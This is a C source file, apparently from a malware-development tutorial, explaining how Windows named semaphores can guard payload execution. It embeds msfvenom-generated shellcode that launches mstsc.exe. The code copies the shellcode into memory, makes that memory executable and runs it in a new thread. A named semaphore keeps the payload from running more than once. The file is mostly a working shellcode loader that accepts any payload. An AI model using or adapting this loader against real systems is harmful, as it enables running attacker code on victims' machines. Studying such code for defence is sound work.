/*
- Windows Synchronization objects can be used to control the execution of a payload.
- These objects coordinate the access of shared memory resources by multiple threads or processes,
	preventing conflics or race conditions when multiple threads or prcesses attempt to access the same resource.

- There are 3 types of synchoronization objects;
	1. Semaphores
		- Semaphores utilize a value stored in memory to controll access to a shared resource.
		- There are 2 types of semaphores;
			1. Binary -> Has value of 1 or 0, indicating whether the resource is available or not.
			2. Counting -> Has greather value than 1, representing the number of available resources or the number of processes that can access the resource currently.


- To control execution of a payload, a named semaphore object will be created each time the payload is executed.
- CreateSemaphoreA will be used to create a semaphore object. It is important to create it as a named semaphore to prevent executions after the initial binary run
		
*/

#include <Windows.h>
#include <stdio.h>

// msfvenom -p windows/x64/exec CMD=mstsc.exe EXITFUNC=thread -f c 0

unsigned char Shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x6d\x73\x74\x73\x63\x2e\x65\x78\x65\x00";




HANDLE hThread = NULL;

// Function to allocate memory, copy payload, and set permissions
BOOL AllocateMemory(OUT PBYTE* ppAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
    DWORD dwOldProtect = 0;

    // Allocate memory at a specific address
    *ppAddress = (PBYTE)VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error Code: %d\n", GetLastError());
        return FALSE;
    }

    // Change permission to read / write
    if (!VirtualProtect(*ppAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        printf("[!] VirtualProtect Failed With Error Code: %d\n", GetLastError());
        return FALSE;
    }

    memcpy(*ppAddress, pPayload, sPayloadSize);
    printf("\t[I] Memory Allocated At: 0x%p \n", *ppAddress);
    getchar();

    return TRUE;
}

// Function that coordinates shared resources (controls the execution of the shellcode)
BOOL SemaMethod() {
    HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "0xBinarySlu3th");

    if (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
        return TRUE;
    else
        return FALSE;
}

// Function to run a payload
BOOL RunPayload(const char* payloadName, PBYTE pPayload, SIZE_T payloadSize) {
    PBYTE pAddress = NULL;
    HANDLE hThread = NULL;

    // Allocate memory for our shellcode
    if (!AllocateMemory(&pAddress, pPayload, payloadSize)) {
        printf("[!] Failed to allocate memory and run %s\n", payloadName);
        return FALSE;
    }

    // Creating Thread with the address of our payload
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[i] CreateThread for %s Has Failed With Error Code: %d\n", payloadName, GetLastError());
        return FALSE;
    }
    // CloseHandle(hThread); // Close the thread handle since we no longer need it
    printf("[i] %s Started in a New Thread\n", payloadName);

    return TRUE;
}

int main() {
    // Check if the semaphore does not exist before running Payload 1
    if (!SemaMethod()) {
        printf("[i] Running Payload 1 ...\n");
        if (!RunPayload("Payload 1", Shellcode, sizeof(Shellcode))) {
            printf("\t[!] Failed to run Payload 1\n");
            return 1; // Exit with an error code
        }
    }

    // Check if the semaphore does not exist before running Payload 2
    if (!SemaMethod()) {
        printf("[I] Running Payload 2 ...\n");
        if (!RunPayload("Payload 2", Shellcode, sizeof(Shellcode))) {
            printf("\t[!] Failed to run Payload 2\n");
            return 1; // Exit with an error code
        }
     
    }
    else {
        printf("[I] Shellcode Already Injected\n");
        printf("[I] Press <Enter> To Exit 2\n");
        
    }
    getchar();

    // Cleanup and close semaphore handle
    HANDLE hSemaphore = OpenSemaphoreA(SEMAPHORE_MODIFY_STATE, FALSE, "0xBinarySlu3th");
    if (hSemaphore) {
        CloseHandle(hSemaphore);
    }
    return 0; // Exit with a success code
}